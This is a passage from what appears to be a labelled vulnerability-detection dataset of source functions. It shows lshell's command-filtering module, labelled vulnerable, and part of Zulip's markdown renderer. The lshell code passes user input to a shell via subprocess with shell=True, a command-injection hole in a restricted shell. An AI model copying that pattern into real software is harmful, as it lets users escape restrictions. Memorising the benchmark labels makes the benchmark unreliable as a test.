is_deleted(self):\n        return sip.isdeleted(self._widget)\n", "target": 0}
{"idx": 1038, "func": "#\n#  Limited command Shell (lshell)\n#\n#  Copyright (C) 2008-2013 Ignace Mouzannar (ghantoos) <ghantoos@ghantoos.org>\n#\n#  This file is part of lshell\n#\n#  This program is free software: you can redistribute it and/or modify\n#  it under the terms of the GNU General Public License as published by\n#  the Free Software Foundation, either version 3 of the License, or\n#  (at your option) any later version.\n#\n#  This program is distributed in the hope that it will be useful,\n#  but WITHOUT ANY WARRANTY; without even the implied warranty of\n#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#  GNU General Public License for more details.\n#\n#  You should have received a copy of the GNU General Public License\n#  along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nimport sys\nimport re\nimport os\n\n# import lshell specifics\nfrom lshell import utils\n\n\ndef warn_count(messagetype, command, conf, strict=None, ssh=None):\n    \"\"\" Update the warning_counter, log and display a warning to the user\n    \"\"\"\n\n    log = conf['logpath']\n    if not ssh:\n        if strict:\n            conf['warning_counter'] -= 1\n            if conf['warning_counter'] < 0:\n                log.critical('*** forbidden %s -> \"%s\"'\n                             % (messagetype, command))\n                log.critical('*** Kicked out')\n                sys.exit(1)\n            else:\n                log.critical('*** forbidden %s -> \"%s\"'\n                             % (messagetype, command))\n                sys.stderr.write('*** You have %s warning(s) left,'\n                                 ' before getting kicked out.\\n'\n                                 % conf['warning_counter'])\n                log.error('*** User warned, counter: %s'\n                          % conf['warning_counter'])\n                sys.stderr.write('This incident has been reported.\\n')\n        else:\n            if not conf['quiet']:\n                log.critical('*** forbidden %s: %s'\n                             % (messagetype, command))\n\n    # if you are here, means that you did something wrong. Return 1.\n    return 1, conf\n\n\ndef check_path(line, conf, completion=None, ssh=None, strict=None):\n    \"\"\" Check if a path is entered in the line. If so, it checks if user\n    are allowed to see this path. If user is not allowed, it calls\n    warn_count. In case of completion, it only returns 0 or 1.\n    \"\"\"\n    allowed_path_re = str(conf['path'][0])\n    denied_path_re = str(conf['path'][1][:-1])\n\n    # split line depending on the operators\n    sep = re.compile(r'\\ |;|\\||&')\n    line = line.strip()\n    line = sep.split(line)\n\n    for item in line:\n        # remove potential quotes or back-ticks\n        item = re.sub(r'^[\"\\'`]|[\"\\'`]$', '', item)\n\n        # remove potential $(), ${}, ``\n        item = re.sub(r'^\\$[\\(\\{]|[\\)\\}]$', '', item)\n\n        # if item has been converted to something other than a string\n        # or an int, reconvert it to a string\n        if type(item) not in ['str', 'int']:\n            item = str(item)\n        # replace \"~\" with home path\n        item = os.path.expanduser(item)\n\n        # expand shell wildcards using \"echo\"\n        # i know, this a bit nasty...\n        if re.findall('\\$|\\*|\\?', item):\n            # remove quotes if available\n            item = re.sub(\"\\\"|\\'\", \"\", item)\n            import subprocess\n            p = subprocess.Popen(\"`which echo` %s\" % item,\n                                 shell=True,\n                                 stdin=subprocess.PIPE,\n                                 stdout=subprocess.PIPE,\n                                 stderr=subprocess.PIPE)\n            cout = p.stdout\n\n            try:\n                item = cout.readlines()[0].decode('utf8').split(' ')[0]\n                item = item.strip()\n                item = os.path.expandvars(item)\n            except IndexError:\n                conf['logpath'].critical('*** Internal error: command not '\n                                         'executed')\n                return 1, conf\n\n        tomatch = os.path.realpath(item)\n        if os.path.isdir(tomatch) and tomatch[-1] != '/':\n            tomatch += '/'\n        match_allowed = re.findall(allowed_path_re, tomatch)\n        if denied_path_re:\n            match_denied = re.findall(denied_path_re, tomatch)\n        else:\n            match_denied = None\n\n        # if path not allowed\n        # case path executed: warn, and return 1\n        # case completion: return 1\n        if not match_allowed or match_denied:\n            if not completion:\n                ret, conf = warn_count('path',\n                                       tomatch,\n                                       conf,\n                                       strict=strict,\n                                       ssh=ssh)\n            return 1, conf\n\n    if not completion:\n        if not re.findall(allowed_path_re, os.getcwd() + '/'):\n            ret, conf = warn_count('path',\n                                   tomatch,\n                                   conf,\n                                   strict=strict,\n                                   ssh=ssh)\n            os.chdir(conf['home_path'])\n            conf['promptprint'] = utils.updateprompt(os.getcwd(),\n                                                     conf)\n            return 1, conf\n    return 0, conf\n\n\ndef check_secure(line, conf, strict=None, ssh=None):\n    \"\"\"This method is used to check the content on the typed command.\n    Its purpose is to forbid the user to user to override the lshell\n    command restrictions.\n    The forbidden characters are placed in the 'forbidden' variable.\n    Feel free to update the list. Emptying it would be quite useless..: )\n\n    A warning counter has been added, to kick out of lshell a user if he\n    is warned more than X time (X being the 'warning_counter' variable).\n    \"\"\"\n\n    # store original string\n    oline = line\n\n    # strip all spaces/tabs\n    line = line.strip()\n\n    # init return code\n    returncode = 0\n\n    # This logic is kept crudely simple on purpose.\n    # At most we might match the same stanza twice\n    # (for e.g. \"'a'\", 'a') but the converse would\n    # require detecting single quotation stanzas\n    # nested within double quotes and vice versa\n    relist = re.findall(r'[^=]\\\"(.+)\\\"', line)\n    relist2 = re.findall(r'[^=]\\'(.+)\\'', line)\n    relist = relist + relist2\n    for item in relist:\n        if os.path.exists(item):\n            ret_check_path, conf = check_path(item, conf, strict=strict)\n            returncode += ret_check_path\n\n    # ignore quoted text\n    line = re.sub(r'\\\"(.+?)\\\"', '', line)\n    line = re.sub(r'\\'(.+?)\\'', '', line)\n\n    if re.findall('[:cntrl:].*\\n', line):\n        ret, conf = warn_count('syntax',\n                               oline,\n                               conf,\n                               strict=strict,\n                               ssh=ssh)\n        return ret, conf\n\n    for item in conf['forbidden']:\n        # allow '&&' and '||' even if singles are forbidden\n        if item in ['&', '|']:\n            if re.findall(\"[^\\%s]\\%s[^\\%s]\" % (item, item, item), line):\n                ret, conf = warn_count('syntax',\n                                       oline,\n                                       conf,\n                                       strict=strict,\n                                       ssh=ssh)\n                return ret, conf\n        else:\n            if item in line:\n                ret, conf = warn_count('syntax',\n                                       oline,\n                                       conf,\n                                       strict=strict,\n                                       ssh=ssh)\n                return ret, conf\n\n    # check if the line contains $(foo) executions, and check them\n    executions = re.findall('\\$\\([^)]+[)]', line)\n    for item in executions:\n        # recurse on check_path\n        ret_check_path, conf = check_path(item[2:-1].strip(),\n                                          conf,\n                                          strict=strict)\n        returncode += ret_check_path\n\n        # recurse on check_secure\n        ret_check_secure, conf = check_secure(item[2:-1].strip(),\n                                              conf,\n                                              strict=strict)\n        returncode += ret_check_secure\n\n    # check for executions using back quotes '`'\n    executions = re.findall('\\`[^`]+[`]', line)\n    for item in executions:\n        ret_check_secure, conf = check_secure(item[1:-1].strip(),\n                                              conf,\n                                              strict=strict)\n        returncode += ret_check_secure\n\n    # check if the line contains ${foo=bar}, and check them\n    curly = re.findall('\\$\\{[^}]+[}]', line)\n    for item in curly:\n        # split to get variable only, and remove last character \"}\"\n        if re.findall(r'=|\\+|\\?|\\-', item):\n            variable = re.split('=|\\+|\\?|\\-', item, 1)\n        else:\n            variable = item\n        ret_check_path, conf = check_path(variable[1][:-1],\n                                          conf,\n                                          strict=strict)\n        returncode += ret_check_path\n\n    # if unknown commands where found, return 1 and don't execute the line\n    if returncode > 0:\n        return 1, conf\n    # in case the $(foo) or `foo` command passed the above tests\n    elif line.startswith('$(') or line.startswith('`'):\n        return 0, conf\n\n    # in case ';', '|' or '&' are not forbidden, check if in line\n    lines = []\n\n    # corrected by Alojzij Blatnik #48\n    # test first character\n    if line[0] in [\"&\", \"|\", \";\"]:\n        start = 1\n    else:\n        start = 0\n\n    # split remaining command line\n    for i in range(1, len(line)):\n        # in case \\& or \\| or \\; don't split it\n        if line[i] in [\"&\", \"|\", \";\"] and line[i - 1] != \"\\\\\":\n            # if there is more && or || skip it\n            if start != i:\n                lines.append(line[start:i])\n            start = i + 1\n\n    # append remaining command line\n    if start != len(line):\n        lines.append(line[start:len(line)])\n\n    # remove trailing parenthesis\n    line = re.sub('\\)$', '', line)\n    for separate_line in lines:\n        separate_line = \" \".join(separate_line.split())\n        splitcmd = separate_line.strip().split(' ')\n        command = splitcmd[0]\n        if len(splitcmd) > 1:\n            cmdargs = splitcmd\n        else:\n            cmdargs = None\n\n        # in case of a sudo command, check in sudo_commands list if allowed\n        if command == 'sudo':\n            if type(cmdargs) == list:\n                # allow the -u (user) flag\n                if cmdargs[1] == '-u' and cmdargs:\n                    sudocmd = cmdargs[3]\n                else:\n                    sudocmd = cmdargs[1]\n                if sudocmd not in conf['sudo_commands'] and cmdargs:\n                    ret, conf = warn_count('sudo command',\n                                           oline,\n                                           conf,\n                                           strict=strict,\n                                           ssh=ssh)\n                    return ret, conf\n\n        # if over SSH, replaced allowed list with the one of overssh\n        if ssh:\n            conf['allowed'] = conf['overssh']\n\n        # for all other commands check in allowed list\n        if command not in conf['allowed'] and command:\n            ret, conf = warn_count('command',\n                                   command,\n                                   conf,\n                                   strict=strict,\n                                   ssh=ssh)\n            return ret, conf\n    return 0, conf\n", "target": 1}
{"idx": 1039, "func": "# Zulip's main markdown implementation.  See docs/subsystems/markdown.md for\n# detailed documentation on our markdown syntax.\nfrom typing import (Any, Callable, Dict, Iterable, List, NamedTuple,\n                    Optional, Set, Tuple, TypeVar, Union, cast)\nfrom mypy_extensions import TypedDict\nfrom typing.re import Match, Pattern\n\nimport markdown\nimport logging\nimport traceback\nimport urllib\nimport re\nimport os\nimport html\nimport time\nimport functools\nimport ujson\nimport xml.etree.cElementTree as etree\nfrom xml.etree.cElementTree import Element\n\nfrom collections import deque, defaultdict\n\nimport requests\n\nfrom django.conf import settings\nfrom django.db.models import Q\n\nfrom markdown.extensions import codehilite, nl2br, tables\nfrom zerver.lib.bugdown import fenced_code\nfrom zerver.lib.bugdown.fenced_code import FENCE_RE\nfrom zerver.lib.camo import get_camo_url\nfrom zerver.lib.emoji import translate_emoticons, emoticon_regex\nfrom zerver.lib.mention import possible_mentions, \\\n    possible_user_group_mentions, extract_user_group\nfrom zerver.lib.url_encoding import encode_stream\nfrom zerver.lib.thumbnail import user_uploads_or_external\nfrom zerver.lib.timeout import timeout, TimeoutExpired\nfrom zerver.lib.cache import cache_with_key, NotFoundInCache\nfrom zerver.lib.url_preview import preview as link_preview\nfrom zerver.models import (\n    all_realm_filters,\n    get_active_streams,\n    MAX_MESSAGE_LENGTH,\n    Message,\n    Realm,\n    realm_filters_for_realm,\n    UserProfile,\n    UserGroup,\n    UserGroupMembership,\n)\nimport zerver.lib.mention as mention\nfrom zerver.lib.tex import render_tex\nfrom zerver.lib.exceptions import BugdownRenderingException\n\nReturnT = TypeVar('ReturnT')\n\ndef one_time(method: Callable[[], ReturnT]) -> Callable[[], ReturnT]:\n    '''\n        Use this decorator with extreme caution.\n        The function you wrap should have no dependency\n        on any arguments (no args, no kwargs) nor should\n        it depend on any global state.\n    '''\n    val = None\n\n    def cache_wrapper() -> ReturnT:\n        nonlocal val\n        if val is None:\n            val = method()\n        return val\n    return cache_wrapper\n\nFullNameInfo = TypedDict('FullNameInfo', {\n    'id': int,\n    'email': str,\n    'full_name': str,\n})\n\nDbData = Dict[str, Any]\n\n# Format version of the bugdown rendering; stored along with rendered\n# messages so that we can efficiently determine what needs to be re-rendered\nversion = 1\n\n_T = TypeVar('_T')\nElementStringNone = Union[Element, Optional[str]]\n\nAVATAR_REGEX = r'!avatar\\((?P<email>[^)]*)\\)'\nGRAVATAR_REGEX = r'!gravatar\\((?P<email>[^)]*)\\)'\nEMOJI_REGEX = r'(?P<syntax>:[\\w\\-\\+]+:)'\n\ndef verbose_compile(pattern: str) -> Any:\n    return re.compile(\n        \"^(.*?)%s(.*?)$\" % pattern,\n        re.DOTALL | re.UNICODE | re.VERBOSE\n    )\n\ndef normal_compile(pattern: str) -> Any:\n    return re.compile(\n        r\"^(.*?)%s(.*)$\" % pattern,\n        re.DOTALL | re.UNICODE\n    )\n\nSTREAM_LINK_REGEX = r\"\"\"\n                     (?<![^\\s'\"\\(,:<])            # Start after whitespace or specified chars\n                     \\#\\*\\*                       # and after hash sign followed by double asterisks\n                         (?P<stream_name>[^\\*]+)  # stream name can contain anything\n                     \\*\\*                         # ends by double asterisks\n                    \"\"\"\n\n@one_time\ndef get_compiled_stream_link_regex() -> Pattern:\n    return verbose_compile(STREAM_LINK_REGEX)\n\nLINK_REGEX = None  # type: Pattern\n\ndef get_web_link_regex() -> str:\n    # We create this one time, but not at startup.  So the\n    # first message rendered in any process will have some\n    # extra costs.  It's roughly 75ms to run this code, so\n    # caching the value in LINK_REGEX is super important here.\n    global LINK_REGEX\n    if LINK_REGEX is not None:\n        return LINK_REGEX\n\n    tlds = '|'.join(list_of_tlds())\n\n    # A link starts at a word boundary, and ends at space, punctuation, or end-of-input.\n    #\n    # We detect a url either by the `https?://` or by building around the TLD.\n\n    # In lieu of having a recursive regex (which python doesn't support) to match\n    # arbitrary numbers of nested matching parenthesis, we manually build a regexp that\n    # can match up to six\n    # The inner_paren_contents chunk matches the innermore non-parenthesis-holding text,\n    # and the paren_group matches text with, optionally, a matching set of parens\n    inner_paren_contents = r\"[^\\s()\\\"]*\"\n    paren_group = r\"\"\"\n                    [^\\s()\\\"]*?            # Containing characters that won't end the URL\n                    (?: \\( %s \\)           # and more characters in matched parens\n                        [^\\s()\\\"]*?        # followed by more characters\n                    )*                     # zero-or-more sets of paired parens\n                   \"\"\"\n    nested_paren_chunk = paren_group\n    for i in range(6):\n        nested_paren_chunk = nested_paren_chunk % (paren_group,)\n    nested_paren_chunk = nested_paren_chunk % (inner_paren_contents,)\n\n    file_links = r\"| (?:file://(/[^/ ]*)+/?)\" if settings.ENABLE_FILE_LINKS else r\"\"\n    REGEX = r\"\"\"\n        (?<![^\\s'\"\\(,:<])    # Start after whitespace or specified chars\n                             # (Double-negative lookbehind to allow start-of-string)\n        (?P<url>             # Main group\n            (?:(?:           # Domain part\n                https?://[\\w.:@-]+?   # If it has a protocol, anything goes.\n               |(?:                   # Or, if not, be more strict to avoid false-positives\n                    (?:[\\w-]+\\.)+     # One or more domain components, separated by dots\n                    (?:%s)            # TLDs (filled in via format from tlds-alpha-by-domain.txt)\n                )\n            )\n            (?:/             # A path, beginning with /\n                %s           # zero-to-6 sets of paired parens\n            )?)              # Path is optional\n            | (?:[\\w.-]+\\@[\\w.-]+\\.[\\w]+) # Email is separate, since it can't have a path\n            %s               # File path start with file:///, enable by setting ENABLE_FILE_LINKS=True\n            | (?:bitcoin:[13][a-km-zA-HJ-NP-Z1-9]{25,34})  # Bitcoin address pattern, see https://mokagio.github.io/tech-journal/2014/11/21/regex-bitcoin.html\n        )\n        (?=                            # URL must be followed by (not included in group)\n            [!:;\\?\\),\\.\\'\\\"\\>]*         # Optional punctuation characters\n            (?:\\Z|\\s)                  # followed by whitespace or end of string\n        )\n        \"\"\" % (tlds, nested_paren_chunk, file_links)\n    LINK_REGEX = verbose_compile(REGEX)\n    return LINK_REGEX\n\ndef clear_state_for_testing() -> None:\n    # The link regex never changes in production, but our tests\n    # try out both sides of ENABLE_FILE_LINKS, so we need\n    # a way to clear it.\n    global LINK_REGEX\n    LINK_REGEX = None\n\nbugdown_logger = logging.getLogger()\n\ndef rewrite_local_links_to_relative(db_data: Optional[DbData], link: str) -> str:\n    \"\"\" If the link points to a local destination we can just switch to that\n    instead of opening a new tab. \"\"\"\n\n    if db_data:\n        realm_uri_prefix = db_data['realm_uri'] + \"/\"\n        if link.startswith(realm_uri_prefix):\n            # +1 to skip the `/` before the hash link.\n            return link[len(realm_uri_prefix):]\n\n    return link\n\ndef url_embed_preview_enabled(message: Optional[Message]=None,\n                              realm: Optional[Realm]=None,\n                              no_previews: Optional[bool]=False) -> bool:\n    if not settings.INLINE_URL_EMBED_PREVIEW:\n        return False\n\n    if no_previews:\n        return False\n\n    if realm is None:\n        if message is not None:\n            realm = message.get_realm()\n\n    if realm is None:\n        # realm can be None for odd use cases\n        # like generating documentation or running\n        # test code\n        return True\n\n    return realm.inline_url_embed_preview\n\ndef image_preview_enabled(message: Optional[Message]=None,\n                          realm: Optional[Realm]=None,\n                          no_previews: Optional[bool]=False) -> bool:\n    if not settings.INLINE_IMAGE_PREVIEW:\n        return False\n\n    if no_previews:\n        return False\n\n    if realm is None:\n        if message is not None:\n            realm = message.get_realm()\n\n    if realm is None:\n        # realm can be None for odd use cases\n        # like generating documentation or running\n        # test code\n        return True\n\n    return realm.inline_image_preview\n\ndef list_of_tlds() -> List[str]:\n    # HACK we manually blacklist a few domains\n    blacklist = ['PY\\n', \"MD\\n\"]\n\n    # tlds-alpha-by-domain.txt comes from http://data.iana.org/TLD/tlds-alpha-by-domain.txt\n    tlds_file = os.path.join(os.path.dirname(__file__), 'tlds-alpha-by-domain.txt')\n    tlds = [tld.lower().strip() for tld in open(tlds_file, 'r')\n            if tld not in blacklist and not tld[0].startswith('#')]\n    tlds.sort(key=len, reverse=True)\n    return tlds\n\ndef walk_tree(root: Element,\n              processor: Callable[[Element], Optional[_T]],\n              stop_after_first: bool=False) -> List[_T]:\n    results = []\n    queue = deque([root])\n\n    while queue:\n        currElement = queue.popleft()\n        for child in currElement.getchildren():\n            if child.getchildren():\n                queue.append(child)\n\n            result = processor(child)\n            if result is not None:\n                results.append(result)\n                if stop_after_first:\n                    return results\n\n    return results\n\nElementFamily = NamedTuple('ElementFamily', [\n    ('grandparent', Optional[Element]),\n    ('parent', Element),\n    ('child', Element)\n])\n\nResultWithFamily = NamedTuple('ResultWithFamily', [\n    ('family', ElementFamily),\n    ('result', Any)\n])\n\nElementPair = NamedTuple('ElementPair', [\n    ('parent', Optional[Element]),\n    ('value', Element)\n])\n\ndef walk_tree_with_family(root: Element,\n                          processor: Callable[[Element], Optional[_T]]\n                          ) -> List[ResultWithFamily]:\n    results = []\n\n    queue = deque([ElementPair(parent=None, value=root)])\n    while queue:\n        currElementPair = queue.popleft()\n        for child in currElementPair.value.getchildren():\n            if child.getchildren():\n                queue.append(ElementPair(parent=currElementPair, value=child))  # type: ignore  # Lack of Deque support in typing module for Python 3.4.3\n            result = processor(child)\n            if result is not None:\n                if currElementPair.parent is not None:\n                    grandparent_element = cast(ElementPair, currElementPair.parent)\n                    grandparent = grandparent_element.value\n                else:\n                    grandparent = None\n                family = ElementFamily(\n                    grandparent=grandparent,\n                    parent=currElementPair.value,\n                    child=child\n                )\n\n                results.append(ResultWithFamily(\n                    family=family,\n                    result=result\n                ))\n\n    return results\n\n# height is not actually used\ndef add_a(\n        root: Element,\n        url: str,\n        link: str,\n        title: Optional[str]=None,\n        desc: Optional[str]=None,\n        class_attr: str=\"message_inline_image\",\n        data_id: Optional[str]=None,\n        insertion_index: Optional[int]=None,\n        already_thumbnailed: Optional[bool]=False\n) -> None:\n    title = title if title is not None else url_filename(link)\n    title = title if title else \"\"\n    desc = desc if desc is not None else \"\"\n\n    if insertion_index is not None:\n        div = markdown.util.etree.Element(\"div\")\n        root.insert(insertion_index, div)\n    else:\n        div = markdown.util.etree.SubElement(root, \"div\")\n\n    div.set(\"class\", class_attr)\n    a = markdown.util.etree.SubElement(div, \"a\")\n    a.set(\"href\", link)\n    a.set(\"target\", \"_blank\")\n    a.set(\"title\", title)\n    if data_id is not None:\n        a.set(\"data-id\", data_id)\n    img = markdown.util.etree.SubElement(a, \"img\")\n    if settings.THUMBNAIL_IMAGES and (not already_thumbnailed) and user_uploads_or_external(url):\n        # See docs/thumbnailing.md for some high-level documentation.\n        #\n        # We strip leading '/' from relative URLs here to ensure\n        # consistency in what gets passed to /thumbnail\n        url = url.lstrip('/')\n        img.set(\"src\", \"/thumbnail?url={0}&size=thumbnail\".format(\n            urllib.parse.quote(url, safe='')\n        ))\n        img.set('data-src-fullsize', \"/thumbnail?url={0}&size=full\".format(\n            urllib.parse.quote(url, safe='')\n        ))\n    else:\n        img.set(\"src\", url)\n\n    if class_attr == \"message_inline_ref\":\n        summary_div = markdown.util.etree.SubElement(div, \"div\")\n        title_div = markdown.util.etree.SubElement(summary_div, \"div\")\n        title_div.set(\"class\", \"message_inline_image_title\")\n        title_div.text = title\n        desc_div = markdown.util.etree.SubElement(summary_div, \"desc\")\n        desc_div.set(\"class\", \"message_inline_image_desc\")\n\ndef add_embed(root: Element, link: str, extracted_data: Dict[str, Any]) -> None:\n    container = markdown.util.etree.SubElement(root, \"div\")\n    container.set(\"class\", \"message_embed\")\n\n    img_link = extracted_data.get('image')\n    if img_link:\n        parsed_img_link = urllib.parse.urlparse(img_link)\n        # Append domain where relative img_link url is given\n        if not parsed_img_link.netloc:\n            parsed_url = urllib.parse.urlparse(link)\n            domain = '{url.scheme}://{url.netloc}/'.format(url=parsed_url)\n            img_link = urllib.parse.urljoin(domain, img_link)\n        img = markdown.util.etree.SubElement(container, \"a\")\n        img.set(\"style\", \"background-image: url(\" + img_link + \")\")\n        img.set(\"href\", link)\n        img.set(\"target\", \"_blank\")\n        img.set(\"class\", \"message_embed_image\")\n\n    data_container = markdown.util.etree.SubElement(container, \"div\")\n    data_container.set(\"class\", \"data-container\")\n\n    title = extracted_data.get('title')\n    if title:\n        title_elm = markdown.util.etree.SubElement(data_container, \"div\")\n        title_elm.set(\"class\", \"message_embed_title\")\n        a = markdown.util.etree.SubElement(title_elm, \"a\")\n        a.set(\"href\", link)\n        a.set(\"target\", \"_blank\")\n        a.set(\"title\", title)\n        a.text = title\n    description = extracted_data.get('description')\n    if description:\n        description_elm = markdown.util.etree.SubElement(data_container, \"div\")\n        description_elm.set(\"class\", \"message_embed_description\")\n        description_elm.text = description\n\n@cache_with_key(lambda tweet_id: tweet_id, cache_name=\"database\", with_statsd_key=\"tweet_data\")\ndef fetch_tweet_data(tweet_id: str) -> Optional[Dict[str, Any]]:\n    if settings.TEST_SUITE:\n        from . import testing_mocks\n        res = testing_mocks.twitter(tweet_id)\n    else:\n        creds = {\n            'consumer_key': settings.TWITTER_CONSUMER_KEY,\n            'consumer_secret': settings.TWITTER_CONSUMER_SECRET,\n            'access_token_key': settings.TWITTER_ACCESS_TOKEN_KEY,\n            'access_token_secret': settings.TWITTER_ACCESS_TOKEN_SECRET,\n        }\n        if not all(creds.values()):\n            return None\n\n        # We lazily import twitter here because its import process is\n        # surprisingly slow, and doing so has a significant impact on\n        # the startup performance of `manage.py` commands.\n        import twitter\n\n        try:\n            api = twitter.Api(tweet_mode='extended', **creds)\n            # Sometimes Twitter hangs on responses.  Timing out here\n            # will cause the Tweet to go through as-is with no inline\n            # preview, rather than having the message be rejected\n            # entirely. This timeout needs to be less than our overall\n            # formatting timeout.\n            tweet = timeout(3, api.GetStatus, tweet_id)\n            res = tweet.AsDict()\n        except AttributeError:\n            bugdown_logger.error('Unable to load twitter api, you may have the wrong '\n                                 'library installed, see https://github.com/zulip/zulip/issues/86')\n            return None\n        except TimeoutExpired:\n            # We'd like to try again later and not cache the bad result,\n            # so we need to re-raise the exception (just as though\n            # we were being rate-limited)\n            raise\n        except twitter.TwitterError as e:\n            t = e.args[0]\n            if len(t) == 1 and ('code' in t[0]) and (t[0]['code'] == 34):\n                # Code 34 means that the message doesn't exist; return\n                # None so that we will cache the error\n                return None\n            elif len(t) == 1 and ('code' in t[0]) and (t[0]['code'] == 88 or\n                                                       t[0]['code'] == 130):\n                # Code 88 means that we were rate-limited and 130\n                # means Twitter is having capacity issues; either way\n                # just raise the error so we don't cache None and will\n                # try again later.\n                raise\n            else:\n                # It's not clear what to do in cases of other errors,\n                # but for now it seems reasonable to log at error\n                # level (so that we get notified), but then cache the\n                # failure to proceed with our usual work\n                bugdown_logger.error(traceback.format_exc())\n                return None\n    return res\n\nHEAD_START_RE = re.compile('^head[ >]')\nHEAD_END_RE = re.compile('^/head[ >]')\nMETA_START_RE = re.compile('^meta[ >]')\nMETA_END_RE = re.compile('^/meta[ >]')\n\ndef fetch_open_graph_image(url: str) -> Optional[Dict[str, Any]]:\n    in_head = False\n    # HTML will auto close meta tags, when we start the next tag add\n    # a closing tag if it has not been closed yet.\n    last_closed = True\n    head = []\n    # TODO: What if response content is huge? Should we get headers first?\n    try:\n        content = requests.get(url, timeout=1).text\n    except Exception:\n        return None\n    # Extract the head and meta tags\n    # All meta tags are self closing, have no children or are closed\n    # automatically.\n    for part in content.split('<'):\n        if not in_head and HEAD_START_RE.match(part):\n            # Started the head node output it to have a document root\n            in_head = True\n            head.append('<head>')\n        elif in_head and HEAD_END_RE.match(part):\n            # Found the end of the head close any remaining tag then stop\n            # processing\n            in_head = False\n            if not last_closed:\n                last_closed = True\n                head.append('</meta>')\n            head.append('</head>')\n            break\n\n        elif in_head and META_START_RE.match(part):\n            # Found a meta node copy it\n            if not last_closed:\n                head.append('</meta>')\n                last_closed = True\n            head.append('<')\n            head.append(part)\n            if '/>' not in part:\n                last_closed = False\n\n        elif in_head and META_END_RE.match(part):\n            # End of a meta node just copy it to close the tag\n            head.append('<')\n            head.append(part)\n            last_closed = True\n\n    try:\n        doc = etree.fromstring(''.join(head))\n    except etree.ParseError:\n        return None\n    og_image = doc.find('meta[@property=\"og:image\"]')\n    og_title = doc.find('meta[@property=\"og:title\"]')\n    og_desc = doc.find('meta[@property=\"og:description\"]')\n    title = None\n    desc = None\n    if og_image is not None:\n        image = og_image.get('content')\n    else:\n        return None\n    if og_title is not None:\n        title = og_title.get('content')\n    if og_desc is not None:\n        desc = og_desc.get('content')\n    return {'image': image, 'title': title, 'desc': desc}\n\ndef get_tweet_id(url: str) -> Optional[str]:\n    parsed_url = urllib.parse.urlparse(url)\n    if not (parsed_url.netloc == 'twitter.com' or parsed_url.netloc.endswith('.twitter.com')):\n        return None\n    to_match = parsed_url.path\n    # In old-style twitter.com/#!/wdaher/status/1231241234-style URLs,\n    # we need to look at the fragment instead\n    if parsed_url.path == '/' and len(parsed_url.fragment) > 5:\n        to_match = parsed_url.fragment\n\n    tweet_id_match = re.match(r'^!?/.*?/status(es)?/(?P<tweetid>\\d{10,30})(/photo/[0-9])?/?$', to_match)\n    if not tweet_id_match:\n        return None\n    return tweet_id_match.group(\"tweetid\")\n\nclass InlineHttpsProcessor(markdown.treeprocessors.Treeprocessor):\n    def run(self, root: Element) -> None:\n        # Get all URLs from the blob\n        found_imgs = walk_tree(root, lambda e: e if e.tag == \"img\" else None)\n        for img in found_imgs:\n            url = img.get(\"src\")\n            if not url.startswith(\"http://\"):\n                # Don't rewrite images on our own site (e.g. emoji).\n                continue\n            img.set(\"src\", get_camo_url(url))\n\nclass BacktickPattern(markdown.inlinepatterns.Pattern):\n    \"\"\" Return a `<code>` element containing the matching text. \"\"\"\n    def __init__(self, pattern: str) -> None:\n        markdown.inlinepatterns.Pattern.__init__(self, pattern)\n        self.ESCAPED_BSLASH = '%s%s%s' % (markdown.util.STX, ord('\\\\'), markdown.util.ETX)\n        self.tag = 'code'\n\n    def handleMatch(self, m: Match[str]) -> Union[str, Element]:\n        if m.group(4):\n            el = markdown.util.etree.Element(self.tag)\n            # Modified to not strip whitespace\n            el.text = markdown.util.AtomicString(m.group(4))\n            return el\n        else:\n            return m.group(2).replace('\\\\\\\\', self.ESCAPED_BSLASH)\n\nclass InlineInterestingLinkProcessor(markdown.treeprocessors.Treeprocessor):\n    TWITTER_MAX_IMAGE_HEIGHT = 400\n    TWITTER_MAX_TO_PREVIEW = 3\n    INLINE_PREVIEW_LIMIT_PER_MESSAGE = 5\n\n    def __init__(self, md: markdown.Markdown) -> None:\n        markdown.treeprocessors.Treeprocessor.__init__(self, md)\n\n    def get_actual_image_url(self, url: str) -> str:\n        # Add specific per-site cases to convert image-preview urls to image urls.\n        # See https://github.com/zulip/zulip/issues/4658 for more information\n        parsed_url = urllib.parse.urlparse(url)\n        if (parsed_url.netloc == 'github.com' or parsed_url.netloc.endswith('.github.com')):\n            # https://github.com/zulip/zulip/blob/master/static/images/logo/zulip-icon-128x128.png ->\n            # https://raw.githubusercontent.com/zulip/zulip/master/static/images/logo/zulip-icon-128x128.png\n            split_path = parsed_url.path.split('/')\n            if len(split_path) > 3 and split_path[3] == \"blob\":\n                return urllib.parse.urljoin('https://raw.githubusercontent.com',\n                                            '/'.join(split_path[0:3] + split_path[4:]))\n\n        return url\n\n    def is_image(self, url: str) -> bool:\n        if not self.markdown.image_preview_enabled:\n            return False\n        parsed_url = urllib.parse.urlparse(url)\n        # List from http://support.google.com/chromeos/bin/answer.py?hl=en&answer=183093\n        for ext in [\".bmp\", \".gif\", \".jpg\", \"jpeg\", \".png\", \".webp\"]:\n            if parsed_url.path.lower().endswith(ext):\n                return True\n        return False\n\n    def dropbox_image(self, url: str) -> Optional[Dict[str, Any]]:\n        # TODO: The returned Dict could possibly be a TypedDict in future.\n        parsed_url = urllib.parse.urlparse(url)\n        if (parsed_url.netloc == 'dropbox.com' or parsed_url.netloc.endswith('.dropbox.com')):\n            is_album = parsed_url.path.startswith('/sc/') or parsed_url.path.startswith('/photos/')\n            # Only allow preview Dropbox shared links\n            if not (parsed_url.path.startswith('/s/') or\n                    parsed_url.path.startswith('/sh/') or\n                    is_album):\n                return None\n\n            # Try to retrieve open graph protocol info for a preview\n            # This might be redundant right now for shared links for images.\n            # However, we might want to make use of title and description\n            # in the future. If the actual image is too big, we might also\n            # want to use the open graph image.\n            image_info = fetch_open_graph_image(url)\n\n            is_image = is_album or self.is_image(url)\n\n            # If it is from an album or not an actual image file,\n            # just use open graph image.\n            if is_album or not is_image:\n                # Failed to follow link to find an image preview so\n                # use placeholder image and guess filename\n                if image_info is None:\n                    return None\n\n                image_info[\"is_image\"] = is_image\n                return image_info\n\n            # Otherwise, try to retrieve the actual image.\n            # This is because open graph image from Dropbox may have padding\n            # and gifs do not work.\n            # TODO: What if image is huge? Should we get headers first?\n            if image_info is None:\n                image_info = dict()\n            image_info['is_image'] = True\n            parsed_url_list = list(parsed_url)\n            parsed_url_list[4] = \"dl=1\"  # Replaces query\n            image_info[\"image\"] = urllib.parse.urlunparse(parsed_url_list)\n\n            return image_info\n        return None\n\n    def youtube_id(self, url: str) -> Optional[str]:\n        if not 